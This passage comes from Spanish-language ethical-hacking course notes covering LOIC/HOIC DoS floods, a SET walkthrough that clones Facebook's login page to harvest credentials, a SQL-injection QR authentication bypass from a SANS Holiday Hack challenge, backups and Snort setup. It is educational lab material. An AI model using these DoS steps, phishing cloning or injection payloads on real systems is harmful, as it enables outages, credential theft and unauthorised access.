#### ğŸ§ Â¿Y en Kali Linux?

Ambas pueden correr usando **Wine**:

```bash
sudo apt update && sudo apt install wine
```

Luego:

```bash
wine LOIC.exe
wine HOIC.exe
```

---

### ğŸ§ª EJEMPLO COMPLETO DE ATAQUE DoS EN LABORATORIO

#### ğŸ“˜ Escenario:

- Servidor web local usando **XAMPP**
- Kali Linux o Windows con LOIC
- Ataque desde LOIC a `http://localhost` o `192.168.1.10`

---

#### ğŸ› ï¸ Paso 1: Configura tu servidor web

En una VM Windows o Kali:

1. Instala XAMPP:
   [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

2. Inicia **Apache** y abre en navegador:

   ```
   http://localhost
   ```

---

#### ğŸš€ Paso 2: Ejecuta LOIC

1. Abre LOIC.
2. En el campo â€œ**IP or URL**â€, escribe la IP de tu servidor (por ejemplo `192.168.1.10`).
3. Marca la opciÃ³n: **"I'm a CHARGING my laser"**.
4. Haz clic en "**FIRE!**".

---

#### ğŸ”¥ Resultado esperado

- El servidor empieza a recibir muchas peticiones por segundo.
- Si no estÃ¡ bien configurado o es dÃ©bil, **el sitio se cuelga o se vuelve lento**.

---

#### ğŸ§ª Â¿Y HOIC?

1. Abre HOIC.
2. Haz clic en â€œ+ Add Targetâ€.
3. Agrega la URL del servidor.
4. En â€œPowerâ€ selecciona: `HIGH`.
5. Agrega un â€œBoosterâ€ (opcional).
6. Haz clic en â€œFIRE TEH LAZER!â€.

HOIC simula trÃ¡fico web mÃ¡s realista que LOIC.

---

### ğŸ“Š ComparaciÃ³n LOIC vs HOIC

| Herramienta | Ventajas                  | Desventajas                          |
| ----------- | ------------------------- | ------------------------------------ |
| **LOIC**    | FÃ¡cil, rÃ¡pido, visible    | Detectable fÃ¡cilmente, sin camuflaje |
| **HOIC**    | MÃ¡s realista, usa scripts | Requiere configuraciÃ³n extra, Java   |

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse de ataques DoS?

- Usar firewalls con protecciÃ³n contra DoS.
- Configurar lÃ­mites de conexiÃ³n en el servidor.
- Usar servicios anti-DDoS como Cloudflare.
- Monitorear el trÃ¡fico en tiempo real.

---

### ğŸ“Œ CONCLUSIÃ“N

- LOIC y HOIC son herramientas educativas que muestran cÃ³mo funciona un DoS.
- Nunca deben usarse fuera de laboratorios.
- Ayudan a entender cÃ³mo defender redes reales.

---

[ğŸ”¼](#Ã­ndice)

---

## **888. IngenierÃ­a social**

### ğŸ§  Â¿QuÃ© es la IngenierÃ­a Social?

La **ingenierÃ­a social** es el arte de **manipular psicolÃ³gicamente a una persona** para que **revele informaciÃ³n confidencial**, **entregue acceso** o **realice una acciÃ³n** que compromete la seguridad.

> ğŸ” No se ataca la tecnologÃ­a, sino al **eslabÃ³n mÃ¡s dÃ©bil: el humano**.

---

### ğŸ¯ Ejemplos comunes:

| Tipo de Ataque | DescripciÃ³n                                             | Ejemplo                                                              |
| -------------- | ------------------------------------------------------- | -------------------------------------------------------------------- |
| **Phishing**   | EnvÃ­o de correos falsos que imitan a empresas reales.   | Un correo de â€œtu bancoâ€ que te pide ingresar tus credenciales.       |
| **Vishing**    | Llamadas telefÃ³nicas fraudulentas.                      | Alguien llama diciendo ser de soporte tÃ©cnico para obtener tu clave. |
| **Smishing**   | Phishing vÃ­a SMS.                                       | Mensaje diciendo que ganaste un premio y debes hacer clic.           |
| **Baiting**    | Ofrecer algo tentador para engaÃ±ar.                     | Dejar una USB infectada en una oficina con el nombre â€œNÃ³mina 2025â€.  |
| **Pretexting** | Inventar una historia falsa para conseguir informaciÃ³n. | Fingir ser del Ã¡rea de RRHH pidiendo datos personales.               |

---

### ğŸ› ï¸ Â¿CÃ³mo se instala un entorno de prÃ¡ctica?

Para aprender ingenierÃ­a social de forma Ã©tica, puedes **crear un laboratorio con Kali Linux** y herramientas como **SET (Social-Engineer Toolkit)**.

---

### ğŸ§ InstalaciÃ³n del entorno: Kali Linux + SET

#### ğŸ“¦ Paso 1: Instalar Kali Linux

Tienes dos opciones:

##### âœ… OpciÃ³n A: MÃ¡quina virtual

1. Instala **VirtualBox**:
   ğŸ‘‰ [https://www.virtualbox.org](https://www.virtualbox.org)
2. Descarga imagen de Kali:
   ğŸ‘‰ [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
3. Importa el `.ova` en VirtualBox.

##### âœ… OpciÃ³n B: USB booteable

1. Usa **Rufus** para crear un USB con la ISO de Kali.
2. Bootea desde el USB para usar Kali en vivo.

---

#### ğŸ”§ Paso 2: Verifica que SET estÃ© instalado

Kali Linux ya incluye **SET**.

Para abrirlo:

```bash
sudo setoolkit
```

Si no estÃ¡, instÃ¡lalo con:

```bash
sudo apt update
sudo apt install set
```

---

### ğŸ§ª EJEMPLO COMPLETO: Ataque de Phishing Simulado con SET

> âš ï¸ Solo en un laboratorio, **NO lo hagas en redes reales ni con vÃ­ctimas reales.**

#### ğŸ¯ Objetivo del ataque:

Clonar la pÃ¡gina de inicio de sesiÃ³n de **Facebook** y recolectar credenciales simuladas en red local.

---

#### ğŸªœ Paso a paso:

##### 1. Abrir SET

```bash
sudo setoolkit
```

##### 2. MenÃº principal de SET

Selecciona las opciones:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

##### 3. Ingresar la IP del atacante

Kali te pedirÃ¡:

```
Enter the IP address to which the data will be sent:
```

Escribe tu IP local. Ejemplo:

```
192.168.1.5
```

##### 4. Ingresar el sitio a clonar

Ejemplo:

```
https://facebook.com
```

##### 5. Resultado

SET clona el sitio y levanta un servidor en tu Kali.

Pide a tu vÃ­ctima (otro equipo en tu red local) que visite:

```
http://192.168.1.5
```

Cuando ingresen usuario y contraseÃ±a, esos datos se guardarÃ¡n en un archivo:

```bash
/root/.set/reports/harvester/
```

---

#### ğŸ’¡ SimulaciÃ³n segura

Para practicar sin afectar a nadie:

- Usa dos mÃ¡quinas virtuales (una como atacante, otra como vÃ­ctima).
- Red local (modo puente o red interna).
- No accedas a servicios reales. Solo simula.

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse de la ingenierÃ­a social?

| Defensa                               | Ejemplo                                                         |
| ------------------------------------- | --------------------------------------------------------------- |
| **ConcientizaciÃ³n**                   | Entrenamientos de phishing en empresas.                         |
| **Doble factor (2FA)**                | Aunque obtengan tu contraseÃ±a, no pueden entrar sin tu celular. |
| **Verificar siempre el remitente**    | No hacer clic en correos sospechosos.                           |
| **No abrir archivos o USBs extraÃ±os** | Desconfiar de dispositivos encontrados.                         |

---

### ğŸ§© ConclusiÃ³n

- La ingenierÃ­a social **explota emociones humanas** como la urgencia, el miedo o la curiosidad.
- SET es una herramienta poderosa para entender cÃ³mo funcionan los ataques.
- Practica siempre en entornos seguros y Ã©ticos.

---

[ğŸ”¼](#Ã­ndice)

---

## **889. PolÃ­ticas de seguridad. Seguridad fÃ­sica y Controles de acceso**

### ğŸ“Œ 1. Â¿QuÃ© son las PolÃ­ticas de Seguridad?

Las **polÃ­ticas de seguridad** son **reglas escritas** que definen **cÃ³mo proteger los activos de una organizaciÃ³n**. Estas reglas establecen lo que **se permite**, lo que **se prohÃ­be** y cÃ³mo se **responde** a incidentes.

#### ğŸ§  Ejemplo fÃ¡cil:

Imagina que trabajas en un colegio y hay una regla que dice:
**"Nadie puede entrar al laboratorio sin identificaciÃ³n y sin registrarse."**
ğŸ‘‰ Eso es una polÃ­tica de seguridad **fÃ­sica y de acceso.**

---

### ğŸ“Œ 2. Tipos de polÃ­ticas (simples y claras)

| Tipo de polÃ­tica                       | Â¿QuÃ© protege?                    | Ejemplo sencillo                                 |
| -------------------------------------- | -------------------------------- | ------------------------------------------------ |
| **PolÃ­tica de contraseÃ±as**            | Cuentas de usuario               | MÃ­nimo 8 caracteres, cambiar cada 90 dÃ­as.       |
| **PolÃ­tica de acceso**                 | Recursos fÃ­sicos o digitales     | Solo el personal de TI puede entrar al servidor. |
| **PolÃ­tica de uso aceptable**          | Internet, software, dispositivos | No descargar pelÃ­culas en equipos del trabajo.   |
| **PolÃ­tica de respaldo**               | Datos                            | Hacer backup semanal de la base de datos.        |
| **PolÃ­tica de respuesta a incidentes** | CÃ³mo actuar ante ataques         | Si hay malware, desconectar equipo y avisar.     |

---

### ğŸ“Œ 3. Seguridad fÃ­sica

La **seguridad fÃ­sica** protege **el lugar donde estÃ¡n los datos, servidores, equipos o personas**.

#### ğŸ”’ Ejemplos fÃ¡ciles:

- Cerraduras en los racks de servidores.
- CÃ¡maras de vigilancia.
- Tarjetas magnÃ©ticas para entrar.
- Guardias de seguridad.
- Alarmas contra incendios o robos.

> ğŸ§  No sirve tener un firewall si cualquiera puede entrar y robar tu computadora.

---

### ğŸ“Œ 4. Controles de acceso

Los **controles de acceso** determinan **quiÃ©n puede entrar a un lugar fÃ­sico o acceder a datos digitales**.

#### ğŸ” Tipos de controles:

| Tipo           | Ejemplo fÃ­sico                    | Ejemplo lÃ³gico (digital)                          |
| -------------- | --------------------------------- | ------------------------------------------------- |
| **Preventivo** | Puerta con tarjeta                | ContraseÃ±a y autenticaciÃ³n 2FA                    |
| **Detectivo**  | CÃ¡maras o alarmas                 | Logs de acceso y alertas                          |
| **Correctivo** | Guardia que responde al incidente | Sistema que bloquea cuenta tras intentos fallidos |

---

### ğŸ› ï¸ Â¿CÃ³mo se "instala" esto? (ImplementaciÃ³n real)

**Instalar controles de acceso y seguridad fÃ­sica** significa **adoptar herramientas, prÃ¡cticas y normas**.

#### ğŸ”§ Ejemplos:

- Instalar **una cerradura con lector de huella digital** en la sala de servidores.
- Configurar en un sistema que los usuarios **no puedan acceder fuera de su horario laboral**.
- Aplicar **software de control de acceso** como:

  - **Active Directory (Windows)**: Para dar o negar acceso a carpetas, redes o recursos.
  - **FreeIPA o LDAP (Linux)**: Para controlar el acceso a nivel de dominio.

---

### ğŸ§ª EJEMPLO COMPLETO (SENCILLO)

**Escenario:**
Una empresa pequeÃ±a quiere proteger su sala de servidores y sus datos.

---

#### âœ… Paso 1: PolÃ­ticas escritas

Se define:

- Solo el equipo de TI puede ingresar al cuarto de servidores.
- La puerta del servidor debe estar cerrada con cerradura digital.
- El acceso remoto al sistema se permite solo desde IPs autorizadas.
- Se debe registrar todo ingreso fÃ­sico y digital.

---

#### âœ… Paso 2: Seguridad fÃ­sica

Se instala:

- Cerradura con huella digital en la sala del servidor.
- CÃ¡mara en la entrada.
- UPS para proteger cortes elÃ©ctricos.
- Sensor de humo.

---

#### âœ… Paso 3: Controles de acceso

##### A nivel fÃ­sico:

- El tÃ©cnico de TI **Juan PÃ©rez** tiene permiso de acceso con su huella.

##### A nivel lÃ³gico:

- En Active Directory:

  - Juan accede a la carpeta `\\Servidor\TI\Backups`
  - El personal de contabilidad **no** puede acceder ahÃ­.

---

#### âœ… Paso 4: Prueba

Juan entra al cuarto con su huella â acceso permitido.
Ana de contabilidad intenta ingresar â acceso denegado.

Juan intenta entrar a su carpeta desde su laptop en casa â bloqueado (su IP no es permitida).

---

#### âœ… Paso 5: AuditorÃ­a

- La cÃ¡mara graba cada entrada.
- Los logs del sistema muestran quiÃ©n accediÃ³, cuÃ¡ndo y desde dÃ³nde.
- Si algo falla, el equipo revisa polÃ­ticas y aplica correctivos.

---

### ğŸ›¡ï¸ ConclusiÃ³n:

| Elemento            | Importancia                             |
| ------------------- | --------------------------------------- |
| PolÃ­ticas escritas  | Define reglas claras y evita confusiÃ³n  |
| Seguridad fÃ­sica    | Protege tus activos fÃ­sicos             |
| Controles de acceso | Evita accesos indebidos                 |
| AuditorÃ­a           | Detecta incidentes y permite investigar |

---

[ğŸ”¼](#Ã­ndice)

---

## **890. PrÃ¡ctica: Bypass autenticaciÃ³n QR (Reto 6 SANS Holiday hack)**

### ğŸ§ Â¿QuÃ© implica este reto?

- Se trata de una **autenticaciÃ³n por QR** (como una tarjeta de acceso).
- Se detectÃ³ que el sistema probablemente sufre de **inyecciÃ³n SQL** al procesar el contenido del QR.
- El objetivo es **manipular el valor del QR** para forzar el sistema a autenticarte.

---

### âš™ï¸ Â¿QuÃ© necesitas para practicar?

| Elemento            | DescripciÃ³n                                                   |
| ------------------- | ------------------------------------------------------------- |
| Ambiente controlado | MÃ¡quina virtual local con entorno web o emulador de SANS      |
| Herramientas        | Generador de QR (web o script Python con `qrcode`), navegador |
| Entorno offline     | Evita hacer pruebas en sistemas reales sin permiso            |

---

### ğŸ› ï¸ InstalaciÃ³n / PreparaciÃ³n del entorno

1. **Entorno local**:

   - Puedes recrear un formulario HTTP que reciba una imagen QR.
   - Alternativamente, simula el reto con un pequeÃ±o servidor que lea el contenido del QR y lo pase a una consulta SQL (por ejemplo, en Python o PHP).

2. **Generador de cÃ³digos QR**:

   - Puedes usar sitios como [the-qrcode-generator.com](https://www.the-qrcode-generator.com/) o instalar Python:

     ```bash
     pip install qrcode requests
     ```

3. **Captura del permiso inicial**:

   - Lee el QR de ejemplo (como `oRfjg5uGHmbduj2m`) usando un decoder como [zxing.org](https://zxing.org/w/decode.jspx).

---

### ğŸ§ª EJEMPLO COMPLETO: Bypass de autenticaciÃ³n QR con inyecciÃ³n SQL

#### ğŸ” Paso 1: Analizar el valor del QR original

- Se decodifica: `oRfjg5uGHmbduj2m` ([Medium][1], [InfosecETC][2], [Platzi][3])
- Esto revela que el sistema simplemente toma ese valor para buscar en la tabla `employees`:

  ```sql
  SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '<valor>' LIMIT 1;
  ```

---

#### ğŸš§ Paso 2: Probar inyecciÃ³n bÃ¡sica

Agrega comilla simple para generar error SQL:

```
oRfjg5uGHmbduj2m'
```

El sistema responde:

```
SQL syntax error
```

Esto confirma que el campo es vulnerable ([InfosecETC][2], [Platzi][3])

---

#### ğŸ§  Paso 3: Bypass bÃ¡sico con OR 1=1

Genera un QR con:

```
oRfjg5uGHmbduj2m' OR '1'='1
```

Respuesta:

```
Authorized User Account Has Been Disabled
```

Esto significa que la funciÃ³n login pasÃ³ la condiciÃ³n, pero marcÃ³ `enabled = false` ([Medium][1], [InfosecETC][2])

---

#### ğŸ¯ Paso 4: Injerto final para acceso

Se construyÃ³ un payload que fuerza `enabled = '1'`:

```
oRfjg5uGHmbduj2m' OR '1'='1' AND enabled = '1
```

Genera un nuevo QR con ese valor codificado.
Â¡El panel dice:
**"User Access Granted - Control number 19880715"**!
Ese es el nÃºmero de control final ([InfosecETC][2])

---

### ğŸ“ Script Python de ejemplo (opcional)

```python
import qrcode

payload = "oRfjg5uGHmbduj2m' OR '1'='1' AND enabled = '1"
qr = qrcode.make(payload)
qr.save("bypass_qr.png")
print("QR generado con payload:", payload)
```

Luego envÃ­a `bypass_qr.png` al sistema simulador o WebForm local para procesarlo.

---

### ğŸ“‹ Resumen del flujo

| Paso             | AcciÃ³n                        | Resultado esperado                       |
| ---------------- | ----------------------------- | ---------------------------------------- |
| Escaneo QR       | Decodificar el valor base     | `oRfjg5uGHmbduj2m`                       |
| InyecciÃ³n bÃ¡sica | Agregar `'` al final          | Error SQL                                |
| Bypass parcial   | `' OR '1'='1`                 | Usuario encontrado, pero deshabilitado   |
| Bypass final     | `' OR '1'='1' AND enabled='1` | Acceso concedido, muestra control number |

---

### âœ… ConclusiÃ³n

- El reto combina **ingenierÃ­a inversa de un sistema de autenticaciÃ³n** con **inyecciÃ³n SQL dentro de un QR**.
- Se resolviÃ³ manipulando el contenido del QR para forzar lÃ³gica positiva y condiciÃ³n `enabled = '1'`.
- Ejemplo fÃ¡cil de entender y replicar en laboratorio local con Python o servidor de prueba.

[1]: https://medium.com/%40christoferdirk/the-2018-sans-holiday-hack-challenge-objective-6-162cda2b2816?utm_source=chatgpt.com "The 2018 SANS Holiday Hack Challenge: Objective 6 - Medium"
[2]: https://infosecetc.github.io/hhc18/Objectives/6-badge.html?utm_source=chatgpt.com "Badge Manipulation - 2018 SANS Holiday Hack Challenge Solution"
[3]: https://platzi.com/cursos/ethical-hacking/practica-bypass-autenticacion-qr-reto-6-sans-holid/?utm_source=chatgpt.com "ResoluciÃ³n de Retos de Seguridad en San Holidays Challenge"

---

[ğŸ”¼](#Ã­ndice)

---

## **891. Copias de seguridad. Defensa en lo profundo**

### ğŸ›¡ï¸ Â¿QuÃ© es â€œDefensa en profundidadâ€?

La **Defensa en profundidad** (Defence in Depth) es una **estrategia de seguridad cibernÃ©tica** que no depende de una Ãºnica capa de defensa. En lugar de eso, usa **mÃºltiples capas de protecciÃ³n** para minimizar el riesgo de un ataque exitoso.

#### ğŸ” Ejemplo sencillo:

Imagina que quieres proteger tu casa. Â¿QuÃ© harÃ­as?

1. Pones **puertas con cerradura**.
2. Agregas una **reja**.
3. Instalas **cÃ¡maras de seguridad**.
4. Contratas un **vigilante**.
5. Guardas lo mÃ¡s valioso en una **caja fuerte**.

â¡ï¸ **Eso es defensa en profundidad.**

En el mundo digital:

| Capa                | Ejemplo                                     |
| ------------------- | ------------------------------------------- |
| PerÃ­metro           | Firewall, router seguro                     |
| Red                 | VLAN, IDS/IPS                               |
| Aplicaciones        | AutenticaciÃ³n, actualizaciones              |
| Dispositivos        | Antivirus, cifrado de disco                 |
| Usuario final       | EducaciÃ³n, contraseÃ±as seguras              |
| Copias de seguridad | Backups para restaurar en caso de incidente |

---

### ğŸ’¾ Â¿QuÃ© son las copias de seguridad?

Una **copia de seguridad (backup)** es una **rÃ©plica de los datos importantes** que se almacena en un lugar seguro. Si hay un ataque (por ejemplo, ransomware), pÃ©rdida accidental o fallo de hardware, puedes **recuperar la informaciÃ³n**.

---

#### ğŸ” Tipos de copia de seguridad

| Tipo               | DescripciÃ³n breve                                               |
| ------------------ | --------------------------------------------------------------- |
| Completa           | Copia total de todos los archivos. Lenta pero confiable.        |
| Incremental        | Solo copia lo que ha cambiado desde el Ãºltimo backup. RÃ¡pida.   |
| Diferencial        | Copia lo que cambiÃ³ desde el Ãºltimo backup completo.            |
| Imagen del sistema | Copia exacta del disco completo (incluye el sistema operativo). |

---

#### ğŸ§  Ejemplo prÃ¡ctico de respaldo

SupÃ³n que eres dueÃ±o de una tienda y todos los dÃ­as guardas tus ventas en un archivo llamado `ventas.xlsx`. Si un dÃ­a tu computadora se daÃ±a, y no tienes backup, **pierdes todo**.

Ahora imagina que haces una copia diaria de ese archivo en Google Drive y otra en un disco externo. Entonces, **aunque te hackeen o se borre todo, tienes cÃ³mo restaurarlo**.

---

### ğŸ› ï¸ Â¿CÃ³mo se instala un sistema de backup?

#### OpciÃ³n 1: Usar **Duplicati** (Windows, Linux, Mac)

**Duplicati** es gratuito, encriptado y fÃ¡cil de usar.

##### InstalaciÃ³n (Windows o Linux)

1. Ve a: [https://www.duplicati.com/download](https://www.duplicati.com/download)
2. Instala el programa.
3. Abre el panel web.
4. Crea una nueva copia de seguridad:

   - Selecciona los archivos o carpetas.
   - Elige destino: disco externo, FTP, Google Drive, Dropbox, etc.
   - Programa: todos los dÃ­as a las 9 p.m.
   - Encripta con una contraseÃ±a fuerte.

5. Â¡Listo! Duplicati harÃ¡ copias automÃ¡ticas.

---

#### OpciÃ³n 2: Copia de seguridad simple con script en Linux

```bash
#!/bin/bash
# Backup de la carpeta /home/gustavo
fecha=$(date +%Y-%m-%d)
tar -czvf /backups/home_backup_$fecha.tar.gz /home/gustavo
```

GuÃ¡rdalo como `backup.sh`, dale permisos:

```bash
chmod +x backup.sh
```

Y agrÃ©galo al cron:

```bash
crontab -e
# Ejecutar todos los dÃ­as a las 2:00 a.m.
0 2 * * * /ruta/backup.sh
```

---

### âœ… Ejemplo completo paso a paso

#### ğŸ¯ Objetivo: Proteger tus archivos personales con copia automÃ¡tica diaria a Google Drive.

#### Paso 1: Instalar Duplicati

- Descarga desde [https://www.duplicati.com/download](https://www.duplicati.com/download)
- Instala y abre en navegador `http://localhost:8200/`

#### Paso 2: Crear una tarea de backup

- Nombre: "Backup documentos"
- Origen: `C:\Users\TuNombre\Documents`
- Destino: Google Drive (inicia sesiÃ³n con tu cuenta)
- EncriptaciÃ³n: habilitada
- Frecuencia: diaria a las 10:00 PM
- Â¡Iniciar tarea!

#### Paso 3: Probar restauraciÃ³n

- Borra un archivo de prueba.
- Desde Duplicati: Restaurar â†’ seleccionar archivo â†’ restaurar ubicaciÃ³n.

Â¡Archivo recuperado sin pÃ©rdidas!

---

### ğŸ§  Â¿CÃ³mo encajan los backups en la defensa en profundidad?

Las copias de seguridad son tu **Ãºltima lÃ­nea de defensa**:

- Un firewall puede fallar.
- El antivirus puede no detectar un ransomware.
- Pero **una copia de seguridad offline o en la nube puede salvarte de perder los datos**.

Por eso siempre deben formar parte de una estrategia de **defensa en profundidad**.

---

### ğŸ“Œ ConclusiÃ³n

- âœ… **Copias de seguridad** = protecciÃ³n contra errores, ataques y accidentes.
- âœ… **Defensa en profundidad** = mÃºltiples capas de seguridad.
- âœ… Combinar ambas es una **mejor prÃ¡ctica profesional** en ciberseguridad.

---

[ğŸ”¼](#Ã­ndice)

---

## **892. PrÃ¡ctica: instalaciÃ³n del IDS snort**

### ğŸ” Â¿QuÃ© es Snort?

**Snort** es un **IDS (Sistema de DetecciÃ³n de Intrusos)** que analiza el trÃ¡fico de red en tiempo real y detecta posibles ataques o comportamientos maliciosos. Puede usarse tambiÃ©n como **IPS (Sistema de PrevenciÃ³n de Intrusos)** si se configura para bloquear trÃ¡fico.

---

### ğŸ§  Ejemplo fÃ¡cil de entender

Imagina que tu red es una casa y Snort es un **perro guardiÃ¡n entrenado** para olfatear y ladrar si detecta algo sospechoso como una ventana rota o una puerta forzada.

- Si alguien intenta entrar sin permiso â†’ **Snort "ladra" (alerta)**.
- Si tienes activado el IPS â†’ **Snort "muerde" (bloquea el acceso)**.

---

### ğŸ§± Â¿CÃ³mo funciona Snort?

Snort detecta amenazas con tres mÃ©todos:

1. **Basado en firmas**: como un antivirus, detecta patrones conocidos.
2. **Basado en protocolo**: detecta desviaciones del comportamiento normal.
3. **Basado en anomalÃ­as**: identifica trÃ¡fico inusual.

---

### ğŸ§° Â¿QuÃ© necesito para instalar Snort?

Puedes instalar Snort en:

- Kali Linux ğŸ (muy recomendado)
- Ubuntu / Debian
- Windows (no es lo ideal para producciÃ³n)

AquÃ­ usaremos **Kali Linux** o **Ubuntu**.

---

### ğŸ§ª InstalaciÃ³n de Snort en Kali Linux o Ubuntu

#### Paso 1: Actualiza tu sistema

```bash
sudo apt update && sudo apt upgrade -y
```

#### Paso 2: Instala dependencias

```bash
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev
```

#### Paso 3: Descarga e instala DAQ (Data Acquisition Library)

```bash
cd /tmp
wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
tar -xvzf daq-2.0.7.tar.gz
cd daq-2.0.7
./configure && make && sudo make install
```

#### Paso 4: Descarga e instala Snort

```bash
cd /tmp
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
tar -xvzf snort-2.9.20.tar.gz
cd snort-2.9.20
./configure --enable-sourcefire && make && sudo make install
```

#### Paso 5: Verifica instalaciÃ³n

```bash
snort -V
```

Debe mostrar algo como:
`Snort version 2.9.20`

---

### ğŸ—‚ï¸ ConfiguraciÃ³n bÃ¡sica

#### Paso 6: Crear estructura de carpetas

```bash
sudo mkdir -p /etc/snort/rules
sudo mkdir /var/log/snort
sudo mkdir /usr/local/lib/snort_dynamicrules
```

#### Paso 7: Copiar archivos de configuraciÃ³n

```bash
sudo cp etc/* /etc/snort/
```

#### Paso 8: Crear una regla de ejemplo

Edita el archivo `local.rules`:

```bash
sudo nano /etc/snort/rules/local.rules
```

Agrega:

```snort
alert icmp any any -> any any (msg:"ICMP packet detected"; sid:1000001;)
```

Esta regla detecta cualquier paquete ICMP (como un ping) y lanza una alerta.

---

### ğŸ§ª Ejemplo completo: Detectar un "ping" con Snort

#### 1. Iniciar Snort en modo alerta

```bash
sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0
```

> AsegÃºrate de que `eth0` sea tu interfaz de red. Usa `ip a` o `ifconfig` para verificar.

#### 2. Desde otro equipo o terminal, haz un ping a la mÃ¡quina:

```bash
ping <IP_de_la_mÃ¡quina_con_Snort>
```

#### 3. VerÃ¡s en la consola:

```bash
[**] [1:1000001:0] ICMP packet detected [**]
```

ğŸ‰ Â¡Snort detectÃ³ el trÃ¡fico ICMP! Ya tienes funcionando un IDS bÃ¡sico.

---

### ğŸ“Œ Notas importantes

- Puedes usar **Snort Rules Community** desde [https://www.snort.org/downloads](https://www.snort.org/downloads) para reglas mÃ¡s avanzadas.
- Snort puede trabajar en modo **pasivo (detecciÃ³n)** o **activo (prevenciÃ³n)**.
- Puedes integrarlo con **PulledPork** o **Barnyard2** para automatizar y centralizar alertas.

---

### ğŸ§  Â¿QuÃ© aprendiste?

| Concepto       | ExplicaciÃ³n sencilla                                   |
| -------------- | ------------------------------------------------------ |
| IDS            | Sistema que **detecta intrusiones** en tu red          |
| Snort          | Herramienta libre para implementar un IDS              |
| Regla en Snort | PatrÃ³n que indica a Snort quÃ© buscar                   |
| InstalaciÃ³n    | Kali o Ubuntu recomendado, requiere dependencias y DAQ |
| Ejemplo        | Snort alerta cuando detecta un **ping (ICMP)**         |

---

[ğŸ”¼](#Ã­ndice)

---

| **Inicio**         | **atrÃ¡s 12**                                | **Siguiente 14**                                    |
| ------------------ | ------------------------------------------- | --------------------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_12_Fundamentos_de_Criptografia.md) | [â©](./7_14_Inteligencia_para_la_Ciberseguridad.md) |
